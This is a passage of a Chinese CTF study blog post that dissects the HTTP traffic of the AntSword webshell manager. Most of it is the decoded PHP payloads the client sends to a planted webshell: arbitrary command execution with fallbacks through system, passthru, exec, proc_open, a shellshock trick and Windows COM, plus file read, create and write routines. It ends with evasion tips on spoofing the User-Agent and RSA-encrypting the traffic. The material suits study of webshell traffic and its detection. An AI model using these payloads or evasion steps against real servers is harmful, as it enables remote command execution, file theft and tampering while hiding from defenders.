Bprint(%40fgets(%24io%5B1%5D%2C2048))%3B%7Dwhile(!%40feof(%24io%5B2%5D))%7Bprint(%40fgets(%24io%5B2%5D%2C2048))%3B%7D%40fclose(%24io%5B1%5D)%3B%40fclose(%24io%5B2%5D)%3B%40proc_close(%24p)%3B%7Delseif(fe(&#39;antsystem&#39;))%7B%40antsystem(%24c)%3B%7Delseif(runshellshock(%24d%2C%20%24c))%20%7Breturn%20%24ret%3B%7Delseif(substr(%24d%2C0%2C1)!%3D%22%2F%22%20%26%26%20%40class_exists(%22COM%22))%7B%24w%3Dnew%20COM(&#39;WScript.shell&#39;)%3B%24e%3D%24w-%3Eexec(%24c)%3B%24so%3D%24e-%3EStdOut()%3B%24ret.%3D%24so-%3EReadAll()%3B%24se%3D%24e-%3EStdErr()%3B%24ret.%3D%24se-%3EReadAll()%3Bprint(%24ret)%3B%7Delse%7B%24ret%20%3D%20127%3B%7Dreturn%20%24ret%3B%7D%3B%24ret%3D%40runcmd(%24r.%22%202%3E%261%22)%3Bprint%20(%24ret!%3D0)%3F%22ret%3D%7B%24ret%7D%22%3A%22%22%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B&amp;dd32c0973cea1a&#x3D;Y2QgIi92YXIvd3d3L2h0bWwiO2xzO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ%3D%3D&amp;mbd5f87b32df2b&#x3D;L2Jpbi9zaA%3D%3D</span><br></pre></td></tr></table></figure>

<p>url解码，格式化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c5980976ee6af=</span><br><span class="line">cmd=</span><br><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$output</span>=ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;01fba&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;78e6dcac&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$p</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;mbd5f87b32df2b&quot;</span>]);</span><br><span class="line">    <span class="variable">$s</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;dd32c0973cea1a&quot;</span>]);</span><br><span class="line">    <span class="variable">$envstr</span>=@base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;c5980976ee6af&quot;</span>]);</span><br><span class="line">    <span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="variable">$c</span>=substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>)&#123;</span><br><span class="line">        @putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        @putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$envstr</span>))&#123;</span><br><span class="line">        <span class="variable">$envarr</span>=explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">                @putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$r</span>=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$d</span>=explode(<span class="string">&quot;,&quot;</span>,@ini_get(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$d</span>))&#123;</span><br><span class="line">            <span class="variable">$d</span>=<span class="keyword">array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$d</span>=array_map(<span class="string">&#x27;trim&#x27;</span>,array_map(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>(function_exists(<span class="variable">$f</span>)&amp;&amp;is_callable(<span class="variable">$f</span>)&amp;&amp;!in_array(<span class="variable">$f</span>,<span class="variable">$d</span>));</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line">                <span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line">                putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">                    error_log(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);</span><br><span class="line">            @unlink(<span class="variable">$tmp</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span>=<span class="number">0</span>;</span><br><span class="line">        <span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(fe(<span class="string">&#x27;system&#x27;</span>))&#123;</span><br><span class="line">            @system(<span class="variable">$c</span>,<span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(fe(<span class="string">&#x27;passthru&#x27;</span>))&#123;</span><br><span class="line">            @passthru(<span class="variable">$c</span>,<span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(fe(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">print</span>(@shell_exec(<span class="variable">$c</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(fe(<span class="string">&#x27;exec&#x27;</span>))&#123;</span><br><span class="line">            @exec(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);</span><br><span class="line">            <span class="keyword">print</span>(join(<span class="string">&quot;&quot;</span>,<span class="variable">$o</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(fe(<span class="string">&#x27;popen&#x27;</span>))&#123;</span><br><span class="line">            <span class="variable">$fp</span>=@popen(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">            <span class="keyword">while</span>(!@feof(<span class="variable">$fp</span>))&#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets(<span class="variable">$fp</span>,<span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @pclose(<span class="variable">$fp</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(fe(<span class="string">&#x27;proc_open&#x27;</span>))&#123;</span><br><span class="line">            <span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);</span><br><span class="line">            <span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">1</span>],<span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">2</span>]))&#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">2</span>],<span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @fclose(<span class="variable">$io</span>[<span class="number">1</span>]);</span><br><span class="line">            @fclose(<span class="variable">$io</span>[<span class="number">2</span>]);</span><br><span class="line">            @proc_close(<span class="variable">$p</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(fe(<span class="string">&#x27;antsystem&#x27;</span>))&#123;</span><br><span class="line">            @antsystem(<span class="variable">$c</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>))&#123;</span><br><span class="line">            <span class="variable">$w</span>=<span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line">            <span class="variable">$e</span>=<span class="variable">$w</span>-&gt;exec(<span class="variable">$c</span>);</span><br><span class="line">            <span class="variable">$so</span>=<span class="variable">$e</span>-&gt;StdOut();</span><br><span class="line">            <span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;ReadAll();</span><br><span class="line">            <span class="variable">$se</span>=<span class="variable">$e</span>-&gt;StdErr();</span><br><span class="line">            <span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;ReadAll();</span><br><span class="line">            <span class="keyword">print</span>(<span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="number">127</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable">$ret</span>=@runcmd(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    <span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">dd32c0973cea1a=Y2QgIi92YXIvd3d3L2h0bWwiO2xzO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ==</span><br><span class="line"><span class="comment"># cd &quot;/var/www/html&quot;;ls;echo [S];pwd;echo [E]</span></span><br><span class="line">mbd5f87b32df2b=L2Jpbi9zaA== </span><br><span class="line"><span class="comment"># /bin/sh</span></span><br></pre></td></tr></table></figure>

<p>大概就是利用bash运行，然后返回结果，实在是太长了。。。</p>
<h3 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h3><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=</span><br><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$output</span>=ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;79dfaa6a&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;6befcf28f0f8&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    ob_start();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$F</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;xcb1bd75c217ce&quot;</span>]);</span><br><span class="line">        <span class="variable">$P</span>=@fopen(<span class="variable">$F</span>,<span class="string">&quot;r&quot;</span>);<span class="comment">#打开文件</span></span><br><span class="line">        <span class="keyword">echo</span>(@fread(<span class="variable">$P</span>,filesize(<span class="variable">$F</span>)?filesize(<span class="variable">$F</span>):<span class="number">4096</span>));<span class="comment">#读文件，不清楚大小就读4MB，输出到缓存区</span></span><br><span class="line">        @fclose(<span class="variable">$P</span>);;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    &#125;;</span><br><span class="line">    asoutput();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">xcb1bd75c217ce=L3Zhci93d3cvaHRtbC9pbmRleC5waHA=</span><br><span class="line"><span class="comment">#/var/www/html/index.php</span></span><br></pre></td></tr></table></figure>
<h4 id="新建文件"><a href="#新建文件" class="headerlink" title="新建文件"></a>新建文件</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=</span><br><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$output</span>=ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;4e2d44f&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;e9188218b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> @fwrite(fopen(base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;xcb1bd75c217ce&quot;</span>]),<span class="string">&quot;w&quot;</span>),base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;rc3235e6b73a85&quot;</span>]))?<span class="string">&quot;1&quot;</span>:<span class="string">&quot;0&quot;</span>;</span><br><span class="line">    <span class="comment"># 大概是打开文件，写入Halo AntSword!</span></span><br><span class="line">;&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">rc3235e6b73a85=I0hhbG8gQW50U3dvcmQh </span><br><span class="line"><span class="comment">#Halo AntSword!</span></span><br><span class="line">xcb1bd75c217ce=L3Zhci93d3cvaHRtbC90ZXN0LnR4dA==</span><br><span class="line"><span class="comment">#/var/www/html/test.txt</span></span><br></pre></td></tr></table></figure>
<h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$output</span>=ob_get_contents();</span><br><span class="line">	ob_end_clean();</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;f9e3e350bf&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;3721032877&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> @fwrite(fopen(base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;oa037d12e7ff1b&quot;</span>]),<span class="string">&quot;w&quot;</span>),base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;oa5bfdf2210f2e&quot;</span>]))?<span class="string">&quot;1&quot;</span>:<span class="string">&quot;0&quot;</span>;</span><br><span class="line">	;</span><br><span class="line">    <span class="comment">#就是将数据写到文件</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">oa037d12e7ff1b=L3Zhci93d3cvaHRtbC90ZXN0LnR4dA==</span><br><span class="line"><span class="comment">#/var/www/html/test.txt</span></span><br><span class="line">oa5bfdf2210f2e=dGVzdA==</span><br><span class="line"><span class="comment">#test</span></span><br></pre></td></tr></table></figure>

<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><h3 id="更改UA头"><a href="#更改UA头" class="headerlink" title="更改UA头"></a>更改UA头</h3><p>E:\ctf\CTFTOOLS\web\antSword\antSword-2.1.8.1\modules\request.js<br>中改</p>
<pre><code>// 请求UA
const USER_AGENT = &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#39;;
</code></pre>
<h3 id="RSA加密流量"><a href="#RSA加密流量" class="headerlink" title="RSA加密流量"></a>RSA加密流量</h3><p>利用自带的RSA编码器，生成公钥私钥，将生成的php上传到服务器，蚁剑将编码器改为rsa后重新连接<br><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210925233158.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ant&#x3D;la3KN%2BFosCL%2BwV8SoqFXbjysNZv3Pipg13BSNrtfHRoaXkGJAhLoO2OXtO%2Bu47K87url5Sl6fH%2FtQmjw2sb%2B9kRhIrFxK5bZkOW9BBGtCvNh54n6rCVLeRXDWxkrYhtGuXHZANxxLpJ0%2BKTeThGLCKosfWHbTRn1dJlHy95qLoY%3D%7CxfdFU25cqoWX6%2FkpRLK%2FdOGrWws1NSnArRYMhW3MSRVil2nDp6pkcDLGSwkM1D1hL09kzqZQagSYN37sH%2FMymehinfsD5gGIZJUANmf17X%2BjbS0zObtl68%2FVCmUpvL5stF7mXU6LgdTY2VFvhb2rmuAHm2PcR6ulWBvZxgJoc8U%3D%7Cos9zBh%2FkldShM88wE7jD20L%2BorzmNz%2B%2BFpb8sZbCQWhwtAyrdCux9NIKegA%2FGf6UfZDXWF974NHNo%2BeKrUsid4lw%2BcoEu0ISLD%2FezteTHeBHAwZjPblBwHb7dU6C7Rt8%2F6DwX3MbJxXwcVb1mplukykpCGSG%2BV9X2ipWrac2NcM%3D%7Cx5tBL8n39xfH2LDI3tiug%2F0xbrA9sualN32DxTWc1DS3daqd0Zk%2BOptNFLYblMK89gzDmDYodgY0rs%2FCoQ6s9SD4R%2BXVo8hmI%2FsiGTbKc64HtrVld0xRmkYKanZZuBYu7fUYXWEt35%2FlI5916YZlV3Kk81jXrXCxoRhzUzQ%2B0c8%3D%7CfHn6ZNFKKeKI7GyN7fiod75nffVYYJZ4GEVsdYnMOAEw6Ds45RbIm64Xz5KGZb%2B8K%2FUUSbm%2B0GaSAEWKMzvdGicdAh%2BW7QpG8YnvKEJ1QbyB7xF6Ncba4TGX5iL3e0lNF8rZLUXlkw7NLSi3KN5HZecXlUQ0gD1OqoQ%2BR3VzIYg%3D%7Cjw7awkFmEOao3qxJNOLAO5PyBdyCympc7KDUIs7rrKnJzRhqSUHVffZdyoSglh37qBzr0g3MM3W33wxwq4BnMUtaIJHsnLrashxQjdKxLPB1RuOYjKorLYI5NcWxl6WunTrMf2c%2FMcV%2F5OU8dtQoSkEmRlh9W%2F8ljK2KHc2q3c4%3D%7Ctx6yz2bhEQ8v7E6blADNV2KGVhSXaU484aHodI1Es15yFHlaFRAs6NPCDfArzD%2Byj%2FZtvs%2F%2FItIbZG7mvlQnrQmSqeK5JrLoKcDVSxsuJnS5fZteBt9z1cZv%2BNm5JfPwTIIVZk7OZhXULD6%2Fy3UZIDNAYqzftQAfLzsLjSvWR0U%3D%7CKvLYMP7S3qkOwjv8JX6Es1EJIj8IUgkzwvfQza8j88sYPLM8IZ1fuDM6efkIYW%2BYzI1Pdkv05asoIcVo4wnvFxIxK286gqNgx8c6BWJ96yhrglrHP9YwUzcEhBSrb3Anjc4gsm3cwKhgEpYwcFzpex2DYp5AsRK2p4w%2FvzyGPoI%3D%7CosyGM9%2BgL45wtui9oYPhJHb2to%2BowQnyL5Lbu5t2vODSk3O6wa1yLLjmBNTQQpeJvmm%2BBYzKGi3AHptab0DXbkmEtbh2aBWF2L5RJb%2Bqem487zbaylCb%2BN2ckSED47zmPgZ8Tr00jkR%2Fr82oEEV1ToJ6T7zO%2BMzPe3hAG0jbPE4%3D</span><br></pre></td></tr></table></figure>
<p>可以看到数据已经被加密了</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/264896.html">https://www.freebuf.com/articles/web/264896.html</a><br><a href="https://zhuanlan.zhihu.com/p/369496846">https://zhuanlan.zhihu.com/p/369496846</a></p>
]]></content>
      <categories>
        <category>ctf学习</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
</search>
